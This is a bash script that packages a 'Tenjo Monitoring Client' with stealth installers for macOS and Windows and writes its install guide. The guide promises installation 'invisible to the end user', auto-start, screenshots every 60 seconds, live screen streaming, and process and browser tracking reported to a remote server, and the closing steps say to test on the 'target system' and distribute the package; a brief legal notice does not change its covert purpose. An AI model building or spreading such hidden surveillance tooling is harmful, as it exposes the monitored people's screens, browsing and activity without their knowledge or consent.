#!/bin/bash
# Prepare installer with source files
# This script copies the necessary source files to create a complete installer package

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INSTALLER_DIR="$SCRIPT_DIR/installer_package"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Create installer package directory
log "Creating installer package..."
rm -rf "$INSTALLER_DIR"
mkdir -p "$INSTALLER_DIR"
mkdir -p "$INSTALLER_DIR/src/core"
mkdir -p "$INSTALLER_DIR/src/modules"
mkdir -p "$INSTALLER_DIR/src/utils"

# Copy source files
log "Copying source files..."
cp -r src/core/* "$INSTALLER_DIR/src/core/"
cp -r src/modules/* "$INSTALLER_DIR/src/modules/"
cp -r src/utils/* "$INSTALLER_DIR/src/utils/"
cp main.py "$INSTALLER_DIR/"
cp requirements.txt "$INSTALLER_DIR/" 2>/dev/null || echo "requirements.txt" > "$INSTALLER_DIR/requirements.txt"

# Copy installer scripts
log "Copying installer scripts..."
cp stealth_install_macos.sh "$INSTALLER_DIR/"
cp stealth_install_windows.bat "$INSTALLER_DIR/"
cp stealth_uninstall_macos.sh "$INSTALLER_DIR/"
cp stealth_uninstall_windows.bat "$INSTALLER_DIR/"

# Make scripts executable
chmod +x "$INSTALLER_DIR/stealth_install_macos.sh"
chmod +x "$INSTALLER_DIR/stealth_uninstall_macos.sh"

# Create installation instructions
cat > "$INSTALLER_DIR/INSTALL_INSTRUCTIONS.md" << 'EOF'
# Tenjo Monitoring Client - Installation Instructions

## 🔒 Stealth Installation

This package installs the Tenjo monitoring client in stealth mode, making it invisible to the end user.

### macOS Installation
```bash
chmod +x stealth_install_macos.sh
./stealth_install_macos.sh
```

### Windows Installation
```cmd
stealth_install_windows.bat
```

## ⚙️ Configuration

Before installation, edit the installer script to set your server URL:
- Change `SERVER_URL` to your actual server address
- Update `API_KEY` if needed

## 🚀 Features

- **Stealth Mode**: Hidden installation and operation
- **Auto-Start**: Automatically starts on system boot
- **Screen Monitoring**: Captures screenshots every 60 seconds
- **Live Streaming**: Real-time screen streaming capability
- **Process Monitoring**: Tracks running applications
- **Browser Monitoring**: Monitors web browsing activity

## 📱 Remote Management

Access the dashboard at: `http://your-server-url:8000`

View live streaming at: `http://your-server-url:8000/client/{client-id}/live`

## 🗑️ Uninstallation

### macOS
```bash
./stealth_uninstall_macos.sh
```

### Windows
```cmd
stealth_uninstall_windows.bat
```

## ⚠️ Legal Notice

This software is intended for legitimate monitoring purposes only. Ensure you have proper authorization before installing on any system.
EOF

# Create requirements file
cat > "$INSTALLER_DIR/requirements.txt" << 'EOF'
mss>=9.0.1
Pillow>=10.0.0
requests>=2.31.0
psutil>=5.9.0
pyobjc-framework-ApplicationServices>=10.0; sys_platform == "darwin"
pyobjc-framework-Quartz>=10.0; sys_platform == "darwin"
pywin32>=306; sys_platform == "win32"
pygetwindow>=0.0.9; sys_platform == "win32"
EOF

log "✅ Installer package created successfully!"
log "📦 Package location: $INSTALLER_DIR"
log "📋 Next steps:"
log "   1. Edit SERVER_URL in installer scripts"
log "   2. Test installation on target system"
log "   3. Distribute installer package"

echo ""
echo "Installer package contents:"
ls -la "$INSTALLER_DIR"
